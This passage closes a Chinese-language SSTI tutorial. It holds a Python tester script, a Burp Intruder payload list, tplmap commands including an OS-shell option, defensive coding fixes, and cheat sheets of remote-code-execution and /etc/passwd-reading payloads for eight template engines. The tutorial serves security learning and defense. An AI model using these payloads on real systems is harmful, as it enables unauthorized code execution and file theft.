        print("SSTI Vulnerability Tester")
        print(f"Target: {self.url}")
        print(f"Parameter: {self.param}")
        print("=" * 60)
        
        # 基础检测
        detected = self.run_basic_tests()
        
        if not detected:
            print("\n[!] No SSTI vulnerability detected with basic payloads")
            print("[*] Try manual testing with engine-specific payloads")
            return
        
        # 根据检测结果进行深入测试
        print("\n[*] Running engine-specific tests...")
        for payload, hint in detected:
            for engine in hint.split("/"):
                engine = engine.strip()
                if engine in self.engine_payloads:
                    self.run_engine_tests(engine)


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <param>")
        print(f"Example: {sys.argv[0]} http://target.com/ name")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    tester = SSTITester(url, param)
    tester.run_all_tests()


if __name__ == "__main__":
    main()
```

### 8.2 使用方法

```bash
# 基本用法
python ssti_tester.py http://target.com/ name

# 示例输出
SSTI Vulnerability Tester
Target: http://target.com/
Parameter: name
[*] Running basic SSTI detection...
[-] Not vulnerable: ${7*7}
[+] VULNERABLE: {{7*7}}
    Possible engine: Jinja2/Twig/Nunjucks
[-] Not vulnerable: #{7*7}
...

[*] Testing for Jinja2...
------------------------------------------------------------
[+] Confirmed: Config object
    Payload: {{config}}
```

### 8.3 Burp Suite 测试方法

如果你使用 Burp Suite，可以使用以下方法：

**方法 1：Intruder 批量测试**

1. 捕获请求，发送到 Intruder
2. 标记参数位置：`/?name=§test§`
3. 加载 Payload 列表（见下方）
4. 开始攻击，观察响应长度变化

**Payload 列表 (保存为 ssti_payloads.txt)：**

```
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${{7*7}}
{7*7}
{{7*'7'}}
{{config}}
{{settings}}
{$smarty.version}
{$_SERVER.SERVER_SOFTWARE}
${.version}
#set($x=7*7)$x
<%= self %>
<%= process.version %>
```

**方法 2：使用 Tplmap 工具**

```bash
# 安装
git clone https://github.com/epinna/tplmap.git
cd tplmap

# 使用
python tplmap.py -u "http://target.com/?name=test"

# 指定参数
python tplmap.py -u "http://target.com/" -d "name=test"

# 获取 shell
python tplmap.py -u "http://target.com/?name=test" --os-shell
```

------

## 九、防御与修复

### 9.1 漏洞成因总结

SSTI 漏洞的根本原因是：**用户输入被直接拼接到模板字符串中**

```python
# 危险代码示例

# Python Flask
template = "Hello, " + user_input
render_template_string(template)

# PHP ThinkPHP
View::display("Hello, " . $name);

# Java FreeMarker
template.process("Hello, " + userInput, out);
```

### 9.2 修复方法

**方法 1：使用模板变量（推荐）**

```python
# Python Flask - 正确做法
render_template_string("Hello, {{ name }}", name=user_input)

# PHP ThinkPHP - 正确做法
View::assign('name', $name);
View::display("Hello, {$name}");

# 或者
View::display("Hello, {$name}", ['name' => $name]);
```

**方法 2：输入验证和过滤**

```python
# 白名单验证
import re
if not re.match(r'^[a-zA-Z0-9_]+$', user_input):
    return "Invalid input"

# 黑名单过滤（不推荐，容易绕过）
blacklist = ['{', '}', '$', '#', '<', '>', '%']
for char in blacklist:
    user_input = user_input.replace(char, '')
```

**方法 3：使用沙箱环境**

```python
# Jinja2 沙箱
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string("Hello, {{ name }}")
```

**方法 4：禁用危险功能**

```php
// Smarty - 禁用 PHP 标签
$smarty->php_handling = Smarty::PHP_REMOVE;

// Twig - 禁用危险过滤器
$twig = new \Twig\Environment($loader, [
    'autoescape' => 'html',
]);
```

### 9.3 安全编码建议

1. **永远不要将用户输入直接拼接到模板中**
2. **使用模板引擎提供的变量传递机制**
3. **对用户输入进行严格的白名单验证**
4. **使用沙箱环境限制模板功能**
5. **定期更新模板引擎版本**
6. **进行安全代码审计**

------

## 十、速查表

### 10.1 模板引擎语法速查

| 引擎       | 变量输出     | 表达式         | 注释        | 条件       |
| ---------- | ------------ | -------------- | ----------- | ---------- |
| Jinja2     | `{{var}}`    | `{{7*7}}`      | `{# #}`     | `{% if %}` |
| Twig       | `{{var}}`    | `{{7*7}}`      | `{# #}`     | `{% if %}` |
| Smarty     | `{$var}`     | `{$var\|func}` | `{* *}`     | `{if}`     |
| ThinkPHP   | `{$var}`     | `{$var\|func}` | `{/* */}`   | `{if}`     |
| FreeMarker | `${var}`     | `${7*7}`       | `<#-- -->`  | `<#if>`    |
| Velocity   | `$var`       | `#set($x=7*7)` | `## `       | `#if`      |
| ERB        | `<%= var %>` | `<%= 7*7 %>`   | `<%# %>`    | `<% if %>` |
| EJS        | `<%= var %>` | `<%= 7*7 %>`   | `<%# %>`    | `<% if %>` |
| Blade      | `{{var}}`    | `{{7*7}}`      | `{{-- --}}` | `@if`      |

### 10.2 RCE Payload 速查

| 引擎       | RCE Payload                                                  |
| ---------- | ------------------------------------------------------------ |
| Jinja2     | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig       | `{{['id']\|filter('system')}}`                               |
| Smarty     | `{if system('id')}{/if}`                                     |
| ThinkPHP   | `{$_GET.func\|array_map=$_GET.cmd\|implode}&func=passthru&cmd[]=id` |
| FreeMarker | `${"freemarker.template.utility.Execute"?new()("id")}`       |
| Velocity   | `#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())$rt.exec("id")` |
| ERB        | `<%= system('id') %>`                                        |
| EJS        | `<%= process.mainModule.require('child_process').execSync('id') %>` |

### 10.3 文件读取 Payload 速查

| 引擎       | 文件读取 Payload                                             |
| ---------- | ------------------------------------------------------------ |
| Jinja2     | `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}` |
| Twig       | `{{'/etc/passwd'\|file_excerpt(1,-1)}}`                      |
| ThinkPHP   | `{$_GET.f\|@file\|@implode}&f=/etc/passwd`                   |
| FreeMarker | `${.data_model.class.protectionDomain.codeSource.location}`  |
| ERB        | `<%= File.read('/etc/passwd') %>`                            |

------

## 十一、总结

### 11.1 为什么你的 {{7*7}} 没有反应？

1. **ThinkPHP 使用的是 `{$var}` 语法，不是 `{{var}}`**
2. **不同模板引擎有完全不同的语法**
3. **必须根据目标环境选择正确的测试 Payload**

### 11.2 如何全面测试 SSTI？

1. **先收集信息**：识别后端语言和框架
2. **多种语法测试**：不要只用一种 Payload
3. **观察响应**：计算结果、错误信息、原样输出
4. **确认引擎**：使用特定引擎的 Payload 确认
5. **尝试利用**：信息泄露 → 文件读取 → RCE

### 11.3 记住这个测试顺序

```
${7*7}  →  {{7*7}}  →  {$var}  →  #{7*7}  →  <%= 7*7 %>
   ↓          ↓          ↓          ↓           ↓
 Java      Python      PHP       Java        Ruby
FreeMarker  Jinja2    Smarty   Thymeleaf     ERB
  Mako      Twig    ThinkPHP    SpEL        EJS
```

------

## 参考资料

- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Tplmap - SSTI 自动化工具](https://github.com/epinna/tplmap)
- [ThinkPHP 官方文档 - 模板引擎](https://doc.thinkphp.cn)

------

*笔记作者：Fan*
*最后更新：2025-12-21*
*声明：本文章仅提供于网安交流学习，请勿用于非法途径，读者的一切行为与作者无关*

